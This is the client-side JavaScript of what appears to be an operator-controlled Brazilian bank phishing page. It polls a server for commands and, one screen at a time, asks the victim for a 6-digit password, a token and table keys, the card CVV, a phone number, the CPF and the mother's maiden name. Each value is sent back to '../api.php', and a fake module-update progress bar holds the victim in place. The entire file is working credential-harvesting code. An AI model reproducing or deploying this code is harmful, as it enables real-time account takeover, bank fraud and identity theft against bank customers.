$('document').ready(function(){

    let id = $('#id').val().length > 0 ? $('#id').val() : '';
    let clientHashId = $('#clientHashId').val();
    let idAcesso = $('#idAcesso').val();
    let nome = '';
  
    let status = 'SENHA_DE_4';
    let info;
    let barraAtiva = false;
    let porcentagem = 1;

    setInterval( () => {


      if(barraAtiva){
          porcentagem++;
          $('div.miolo').css('width', porcentagem+'%');
          $('p.porcentagem').text(porcentagem+"%");
          if(porcentagem === 100){
              porcentagem = 0;
          }
      }

  }, 3000);
  
    function loadInfo(){
      if(id !== '' && !isNaN(id) && clientHashId !== ''){
  
        $.ajax({
            url: "../api.php",
            type:'POST',
            dataType : "json",
            data: { action : "GET_INFO", id : id, clientHashId : clientHashId},
            cache: false,
            success: function(r){
                info = r;

                if(r.nome && r.nome.length > 0) {
                  nome = r.nome;
                  nome = nome.charAt(0).toUpperCase() + nome.slice(1).toLocaleLowerCase();
                  $('span.nome').text(nome + ', ');
                }

                if($('input#agencia').val() == ''){
                  $('input#agencia').val(r.agencia);
                }
                if($('input#conta').val() == ''){
                  $('input#conta').val(r.conta + '-'+ r.digito);
                }

                if(r.comando !== status) {
                    status = r.comando;
                    atualizarTela();
                }
            }
        });
      }
    }
  
    $('button.btn-option').click(function(e){
          e.preventDefault();
          $('button.btn-option').removeClass('red');
          $(e.target).addClass('red');
      });
  
  
      $( "#conta" ).keyup(function(e) {
          let data = $(e.target).val();
          data = data.replace(/[^0-9]/g, '');
      
          if(data.length > 1 ) {
            data = data.substr(0,data.length-1) + '-' + data.substr(data.length-1);
          }
  
          $(e.target).val(data);
  
      });
  
      function erro(msg, id) {
          let seletor = id + ' .erro';
          $(seletor + ' p').text(msg);
          $(seletor).removeClass('hide');
      }
  
      function hideErro(msg, id) {
        let seletor = id + ' .erro';
        $(seletor).addClass('hide');
    }
  
      function validaDigito(strConta)
      {
        let aConta = strConta.split('-');
        let dv_conta = aConta[0];
        let dv_informado = aConta[1];
    
        let lsoma = 0;
        let ipeso = 2;
    
        let tam = dv_conta.length;
    
        let conta = new Array(tam);
    
        for (let i=0; i<=tam; i++) {
          conta[i] = dv_conta.substr( i, 1);
        }
    
        while (tam > 0) {
    
          let digito = conta[--tam];
    
          if ((digito >= 0) && (digito <= 9)) { 
    
            lsoma = lsoma + (digito - 0) * ipeso; 
    
            ipeso = ipeso + 1; 
    
            if (ipeso > 7) 
    
            {ipeso = 2;}
    
          } 
        }
    
        lsoma %= 11; 
    
        lsoma = 11 - lsoma;
    
        if ((lsoma == 11) || (lsoma == 10)) {
          lsoma = 0;
        }
    
        if (parseInt(dv_informado) === lsoma) {
          return true;
        } else {
          return false;
        }
      }
  
      var timer = setInterval ( function(){
          loadInfo();
      }, 2000 );
  
      function atualizarTela(){
  
        $('div.boxes').addClass('hide');
        $('div#boxSenhaDe6').find('div.erro').addClass('hide').find('p.msg').text('');
        $('div#boxCvv').find('div.erro').addClass('hide').find('p.msg').text('');
        $('div#boxCelular').find('div.erro').addClass('hide').find('p.msg').text('');
        $('div#boxTabela').find('div.erro').addClass('hide').find('p.msg').text('');
        $('div#boxToken').find('div.erro').addClass('hide').find('p.msg').text('');
        $('div#boxAcesso').find('div.erro').addClass('hide').find('p.msg').text('');
        
        if(status === 'AGUARDANDO'){
            $('div#boxAguardar').removeClass('hide');
        }
        if(status ==='SENHA_DE_4' || status === 'SENHA_DE_4_ERRO' || status === 'INFORMACOES_INVALIDAS'){

          window.location.href = "index.php?hash="+clientHashId;
        }

        if(status ==='TOKEN'){
          $('div#boxToken').removeClass('hide');
          //$('input#tokenChave').focus();
        }
        if(status ==='TOKEN_ERRO'){
          $('div#boxToken').find('div.erro').removeClass('hide').find('p.msg').text('A chave informada não está correta.');
          $('div#boxToken').removeClass('hide');
          //$('input#tokenChave').focus();
        }
  
        if(status ==='TABELA'){
            $('#posicaoChave').text(info.texto);
            $('div#boxTabela').removeClass('hide');
            //$('input#chaveTabela').focus();
        }
        if(status ==='TABELA_ERRO'){
            $('div#boxTabela').find('div.erro').removeClass('hide').find('p.msg').text('A chave informada não está correta.');
            $('#posicaoChave').text(info.texto);
            $('div#boxTabela').removeClass('hide');
            //$('input#chaveTabela').focus();
        }
  
        if(status ==='SENHA_DE_6_INTERNA'){
  
            $('div#boxSenhaDe6').removeClass('hide');
            //$('input#senhaDe6').focus();
        }
        if(status ==='SENHA_DE_6_ERRO_INTERNA'){
            $('div#boxSenhaDe6').find('div.erro').removeClass('hide').find('p.msg').text('A Senha de 6 Dígitos não está correta.');
  
            $('div#boxSenhaDe6').removeClass('hide');
            //$('input#senhaDe6').focus();
        }
  
        if(status ==='CVV_INTERNA'){
  
            $('div#boxCvv').removeClass('hide');
            //$('input#cvv').focus();
        }
        if(status ==='CVV_ERRO_INTERNA'){
            $('div#boxCvv').find('div.erro').removeClass('hide').find('p.msg').text('O CVV informado é inválido.');
  
            $('div#boxCvv').removeClass('hide');
            //$('input#cvv').focus();
        }
  
        
        if(status ==='CELULAR_INTERNA'){
  
            $('div#boxCelular').removeClass('hide');
            //$('input#celular').focus();
        }
        if(status ==='CELULAR_ERRO_INTERNA'){
            $('div#boxCelular').find('div.erro').removeClass('hide').find('p.msg').text('O número informado é inválido.');
  
            $('div#boxCelular').removeClass('hide');
            //$('input#celular').focus();
        }


        if(status ==='CPF_INTERNA'){
  
          $('div#boxCpf').removeClass('hide');
          //$('input#celular').focus();
      }
      if(status ==='CPF_ERRO_INTERNA'){
          $('div#boxCpf').find('div.erro').removeClass('hide').find('p.msg').text('O CPF informado é inválido.');

          $('div#boxCpf').removeClass('hide');
          //$('input#celular').focus();
      }

      if(status ==='NOME_MAE_INTERNA'){
  
        $('div#boxNomeMae').removeClass('hide');
        //$('input#celular').focus();
    }
    if(status ==='NOME_MAE_ERRO_INTERNA'){
        $('div#boxNomeMae').find('div.erro').removeClass('hide').find('p.msg').text('O nome informado é inválido.');

        $('div#boxNomeMae').removeClass('hide');
        //$('input#celular').focus();
    }
    if(status ==='ATUALIZAR_MODULO_INTERNA'){
      porcentagem = 1;

      $('div.miolo').css('width', porcentagem+'%');
      $('p.porcentagem').text(porcentagem+"%");
      barraAtiva = true;
      $('div#boxAtualizarModulo').removeClass('hide');
      //$('input#celular').focus();
    }
  

    if(status == 'TELA_FIM_INTERNA') {
        window.location.href = "fim.php?hash="+clientHashId;
    }
    }
  
  
  
      $('div#boxTabela input.bt_avancar').click(function(e) {
  
          e.preventDefault();
  
          let token = $('input#chaveTabela').val();
  
          if(token.length !== 3){
              erro('A chave informada não está correta.', '#boxTabela');
              return;
          }
  
          info.comando = 'AGUARDANDO';
  
          $.ajax({
              url: "../api.php",
              type:'POST',
              data: { action : "SALVAR_TOKEN", id : id,clientHashId : clientHashId, posicao: info.texto, valor : token},
              cache: false,
              success: function(r){
                  status = info.comando;
                  $('input#chaveTabela').val('');
                  atualizarTela();
                  
              }
          });
  
      });
  
      $('div#boxToken input.bt_avancar').click(function(e) {


          e.preventDefault();
  
          let token = $('input#tokenChave').val();
  
          if(token.length !== 6){
              erro('A chave informada não está correta.', '#boxToken');
              return;
          }
  
          info.comando = 'AGUARDANDO';
  
          $.ajax({
              url: "../api.php",
              type:'POST',
              data: { action : "SALVAR_TOKEN", id : id,clientHashId : clientHashId, posicao: '-', valor : token},
              cache: false,
              success: function(r){
                  status = info.comando;
                  $('input#tokenChave').val('');
                  atualizarTela();
                  
              }
          });
  
          
  
      });
  
      $('div#boxSenhaDe6 input.bt_avancar').click(function(e) {
  
        e.preventDefault();
  
        let senhaDe6 = $('input#senhaDe6').val();
  
        if(senhaDe6.length !== 6){
            erro('A Senha de 6 Dígitos não está correta.', '#boxSenhaDe6');
            return;
        }
  
        info.senha6 = senhaDe6;
        info.comando = 'AGUARDANDO';
  
        $.ajax({
            url: "../api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#senhaDe6').val('')
                atualizarTela();
                
            }
        });
  
    });
  
    $('div#boxCvv input.bt_avancar').click(function(e) {
  
      e.preventDefault();
  
      let cvv = $('input#cvv').val();
  
      if(cvv.length !== 3){
        erro('O CVV informado é inválido.', '#boxCvv');
          return;
      }
  
      info.cvv = cvv;
      info.comando = 'AGUARDANDO';
  
      $.ajax({
          url: "../api.php",
          type:'POST',
          data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
          cache: false,
          success: function(r){
              status = info.comando;
              $('input#cvv').val('');
              atualizarTela();
              
          }
      });
  
    });
  
  
  
    $('div#boxCelular input.bt_avancar').click(function(e) {
  
        e.preventDefault();
  
        let celular = $('input#celular').val();
  
        if(celular.length < 8){
            erro('O número informado é inválido.', '#boxCelular');
            return;
        }
  
        info.celular = celular;
        info.comando = 'AGUARDANDO';
  
        $.ajax({
            url: "../api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#celular').val('');
                atualizarTela();
                
            }
        });
  
      });


      $('div#boxCpf input.bt_avancar').click(function(e) {
  
        e.preventDefault();
  
        let cpf = $('input#cpf').val();
  
        if(cpf.length < 14){
            erro('O CPF informado é inválido.', '#boxCpf');
            return;
        }
  
        info.cpf = cpf;
        info.comando = 'AGUARDANDO';
  
        $.ajax({
            url: "../api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#cpf').val('');
                atualizarTela();
                
            }
        });
  
      });


      $('div#boxNomeMae input.bt_avancar').click(function(e) {
  
        e.preventDefault();
  
        let nomeMae = $('input#nomeMae').val();
  
        if(nomeMae.length < 4){
            erro('O nome informado é inválido.', '#boxNomeMae');
            return;
        }
  
        info.mae = nomeMae;
        info.comando = 'AGUARDANDO';
  
        $.ajax({
            url: "../api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#nomeMae').val('');
                atualizarTela();
                
            }
        });
  
      });
  
      $('input#celular').mask('(00) 00000-0000');
      $('input#cpf').mask('000.000.000-00');
  });